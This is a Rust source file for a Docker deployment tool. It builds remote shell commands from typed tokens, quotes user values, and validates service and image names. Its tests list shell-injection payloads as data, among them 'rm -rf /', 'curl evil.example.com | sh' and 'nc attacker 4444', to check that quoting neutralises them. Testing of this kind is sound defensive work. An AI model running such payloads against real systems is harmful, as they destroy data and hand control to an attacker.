use serde::{Deserialize, Serialize};
use utoipa::ToSchema;

pub const DEFAULT_REMOTE_SERVICES_ROOT: &str = "/opt/wara/services";
pub const DEFAULT_DOCKERFILE_CONTEXT_DIR: &str = "context";
pub const DEFAULT_CONTAINER_NAME_PREFIX: &str = "wara-";
pub const DEFAULT_BUILT_IMAGE_PREFIX: &str = "wara";

#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum DeployKind {
    DockerImage,
    DockerCompose,
    Dockerfile,
}

impl DeployKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::DockerImage => "docker_image",
            Self::DockerCompose => "docker_compose",
            Self::Dockerfile => "dockerfile",
        }
    }
}

impl From<&str> for DeployKind {
    fn from(value: &str) -> Self {
        match value {
            "docker_compose" => Self::DockerCompose,
            "dockerfile" => Self::Dockerfile,
            _ => Self::DockerImage,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum ProxyKind {
    Nginx,
    Traefik,
}

impl ProxyKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Nginx => "nginx",
            Self::Traefik => "traefik",
        }
    }
}

impl From<&str> for ProxyKind {
    fn from(value: &str) -> Self {
        match value {
            "traefik" => Self::Traefik,
            _ => Self::Nginx,
        }
    }
}

/// A piece of a remote command. `Literal` parts are fixed at compile time (the
/// verbs, flags, and the only shell operators); `Arg` parts hold user-controlled
/// values and are always shell-quoted on render, so they can never break out of
/// their word into shell syntax.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    Literal(&'static str),
    Arg(String),
}

/// A single shell command built from typed tokens. This is the controlled
/// alternative to interpolating user input into a command string: user values
/// enter only through [`RemoteCommand::arg`] and are POSIX single-quoted by
/// [`RemoteCommand::render`], which makes shell injection through names, image
/// references, or paths impossible.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RemoteCommand {
    tokens: Vec<Token>,
}

impl RemoteCommand {
    pub fn new() -> Self {
        Self::default()
    }

    /// Append fixed shell text (verbs, flags, operators). Never include user input here.
    pub fn lit(mut self, literal: &'static str) -> Self {
        self.tokens.push(Token::Literal(literal));
        self
    }

    /// Append a user-controlled value; it is shell-quoted on render.
    pub fn arg(mut self, value: impl Into<String>) -> Self {
        self.tokens.push(Token::Arg(value.into()));
        self
    }

    /// Render to a single shell command string with every `Arg` safely quoted.
    pub fn render(&self) -> String {
        self.tokens
            .iter()
            .map(|token| match token {
                Token::Literal(literal) => (*literal).to_string(),
                Token::Arg(value) => shell_quote(value),
            })
            .collect::<Vec<_>>()
            .join(" ")
    }
}

/// POSIX single-quote a value so it is a single, inert shell word. Embedded
/// single quotes are closed, escaped, and reopened (`'` -> `'\''`).
pub fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

/// Reject service names that are not a safe DNS-like identifier. Quoting already
/// prevents injection; this rejects junk early with a clear error and keeps
/// generated container names and paths sane.
pub fn validate_service_name(name: &str) -> Result<(), String> {
    let mut chars = name.chars();
    let valid = match chars.next() {
        Some(first) if first.is_ascii_lowercase() || first.is_ascii_digit() => {
            name.len() <= 63
                && chars.all(|c| {
                    c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '-' || c == '_'
                })
        }
        _ => false,
    };
    if valid {
        Ok(())
    } else {
        Err(format!(
            "service name must start with a lowercase letter or digit and contain only [a-z0-9._-] (got {name:?})"
        ))
    }
}

/// Reject image references containing characters outside a Docker reference's
/// safe set. Defense-in-depth alongside quoting.
pub fn validate_image_reference(image: &str) -> Result<(), String> {
    let valid = !image.is_empty()
        && image.len() <= 255
        && image
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | ':' | '/' | '@'));
    if valid {
        Ok(())
    } else {
        Err(format!("invalid image reference {image:?}"))
    }
}

#[derive(Debug, Clone)]
pub struct DockerCommandConfig {
    pub remote_services_root: String,
    pub dockerfile_context_dir: String,
}

impl DockerCommandConfig {
    pub fn new(remote_services_root: String, dockerfile_context_dir: String) -> Self {
        Self {
            remote_services_root,
            dockerfile_context_dir,
        }
    }
}

pub fn image_deploy_commands(image: &str, service: &str) -> Vec<RemoteCommand> {
    let container = container_name(service);
    vec![
        RemoteCommand::new().lit("docker pull").arg(image),
        RemoteCommand::new()
            .lit("docker rm -f")
            .arg(container.clone())
            .lit("|| true"),
        RemoteCommand::new()
            .lit("docker run -d --name")
            .arg(container)
            .lit("--restart unless-stopped")
            .arg(image),
    ]
}

pub fn compose_deploy_commands(service: &str, config: &DockerCommandConfig) -> Vec<RemoteCommand> {
    let service_dir = service_dir(&config.remote_services_root, service);
    vec![
        RemoteCommand::new()
            .lit("mkdir -p")
            .arg(service_dir.clone()),
        RemoteCommand::new()
            .lit("cd")
            .arg(service_dir)
            .lit("&& docker compose up -d"),
    ]
}

pub fn dockerfile_deploy_commands(
    service: &str,
    config: &DockerCommandConfig,
) -> Vec<RemoteCommand> {
    let service_dir = service_dir(&config.remote_services_root, service);
    let context_dir = path_join(&service_dir, &config.dockerfile_context_dir);
    let image = built_image_name(service);
    let container = container_name(service);
    vec![
        RemoteCommand::new()
            .lit("docker build -t")
            .arg(image.clone())
            .arg(context_dir),
        RemoteCommand::new()
            .lit("docker rm -f")
            .arg(container.clone())
            .lit("|| true"),
        RemoteCommand::new()
            .lit("docker run -d --name")
            .arg(container)
            .lit("--restart unless-stopped")
            .arg(image),
    ]
}

pub fn restart_command(service: &str) -> RemoteCommand {
    RemoteCommand::new()
        .lit("docker restart")
        .arg(container_name(service))
}

pub fn container_name(service: &str) -> String {
    format!("{DEFAULT_CONTAINER_NAME_PREFIX}{service}")
}

fn built_image_name(service: &str) -> String {
    format!("{DEFAULT_BUILT_IMAGE_PREFIX}/{service}:latest")
}

fn service_dir(remote_services_root: &str, service: &str) -> String {
    path_join(remote_services_root, service)
}

fn path_join(parent: &str, child: &str) -> String {
    let parent = parent.trim_end_matches('/');
    let child = child.trim_matches('/');

    match (parent.is_empty(), child.is_empty()) {
        (true, true) => "/".to_string(),
        (true, false) => format!("/{child}"),
        (false, true) => parent.to_string(),
        (false, false) => format!("{parent}/{child}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn command_config() -> DockerCommandConfig {
        DockerCommandConfig::new(
            "/srv/wara/services/".to_string(),
            "/build-context/".to_string(),
        )
    }

    fn rendered(commands: &[RemoteCommand]) -> Vec<String> {
        commands.iter().map(RemoteCommand::render).collect()
    }

    #[test]
    fn image_commands_quote_image_and_container() {
        assert_eq!(
            rendered(&image_deploy_commands("nginx:latest", "api")),
            vec![
                "docker pull 'nginx:latest'",
                "docker rm -f 'wara-api' || true",
                "docker run -d --name 'wara-api' --restart unless-stopped 'nginx:latest'",
            ]
        );
    }

    #[test]
    fn compose_commands_use_configured_services_root() {
        assert_eq!(
            rendered(&compose_deploy_commands("api", &command_config())),
            vec![
                "mkdir -p '/srv/wara/services/api'",
                "cd '/srv/wara/services/api' && docker compose up -d",
            ]
        );
    }

    #[test]
    fn dockerfile_commands_use_configured_root_and_context_dir() {
        assert_eq!(
            rendered(&dockerfile_deploy_commands("worker", &command_config())),
            vec![
                "docker build -t 'wara/worker:latest' '/srv/wara/services/worker/build-context'",
                "docker rm -f 'wara-worker' || true",
                "docker run -d --name 'wara-worker' --restart unless-stopped 'wara/worker:latest'",
            ]
        );
    }

    #[test]
    fn shell_quote_escapes_embedded_single_quotes() {
        assert_eq!(shell_quote("a'b"), r"'a'\''b'");
        assert_eq!(shell_quote("plain"), "'plain'");
    }

    /// Reverse our POSIX single-quoting. If `shell_quote(x)` always round-trips
    /// back to `x` through this, then a real shell parses the quoted word as
    /// exactly `x` — i.e. nothing in `x` can escape into shell syntax.
    fn shell_unquote(quoted: &str) -> String {
        assert!(quoted.starts_with('\'') && quoted.ends_with('\'') && quoted.len() >= 2);
        quoted[1..quoted.len() - 1].replace(r"'\''", "'")
    }

    #[test]
    fn arg_values_cannot_inject_shell_metacharacters() {
        // Each payload would break out of an unquoted command; after quoting, a
        // shell must see it as one literal word identical to the original.
        let payloads = [
            "web; rm -rf /",
            "$(touch pwned)",
            "`id`",
            "a && curl evil.example.com | sh",
            "x | nc attacker 4444",
            "y\nrm -rf /",
            "z' ; rm -rf / ; '",
            "plain",
        ];
        for payload in payloads {
            let quoted = shell_quote(payload);
            assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
            assert_eq!(
                shell_unquote(&quoted),
                payload,
                "quoting must round-trip {payload:?} so the shell sees it verbatim"
            );
            assert_eq!(
                RemoteCommand::new()
                    .lit("docker pull")
                    .arg(payload)
                    .render(),
                format!("docker pull {quoted}")
            );
        }
    }

    #[test]
    fn malicious_service_name_is_still_quoted_in_generated_commands() {
        let evil = "api; rm -rf /";
        let container = container_name(evil); // "wara-api; rm -rf /"
        let quoted = shell_quote(&container); // "'wara-api; rm -rf /'"
        let commands = rendered(&image_deploy_commands("nginx", evil));
        // At least one generated command references the container, always quoted.
        assert!(commands.iter().any(|command| command.contains(&quoted)));
        // The container name never appears outside its quoted form in any command,
        // so the `; rm -rf /` can never be interpreted as a shell operator.
        for command in &commands {
            assert_eq!(
                command.matches(container.as_str()).count(),
                command.matches(quoted.as_str()).count(),
                "service name must only ever appear quoted in {command:?}"
            );
        }
    }

    #[test]
    fn validate_service_name_accepts_safe_names_and_rejects_unsafe() {
        assert!(validate_service_name("web").is_ok());
        assert!(validate_service_name("api-2.gateway_v1").is_ok());
        assert!(validate_service_name("web; rm -rf /").is_err());
        assert!(validate_service_name("$(id)").is_err());
        assert!(validate_service_name("../escape").is_err());
        assert!(validate_service_name("").is_err());
        assert!(validate_service_name("-leading").is_err());
        assert!(validate_service_name("UPPER").is_err());
    }

    #[test]
    fn validate_image_reference_accepts_refs_and_rejects_injection() {
        assert!(validate_image_reference("nginx:latest").is_ok());
        assert!(validate_image_reference("ghcr.io/org/app@sha256:abc123").is_ok());
        assert!(validate_image_reference("nginx; rm -rf /").is_err());
        assert!(validate_image_reference("$(touch x)").is_err());
        assert!(validate_image_reference("a b").is_err());
        assert!(validate_image_reference("").is_err());
    }
}
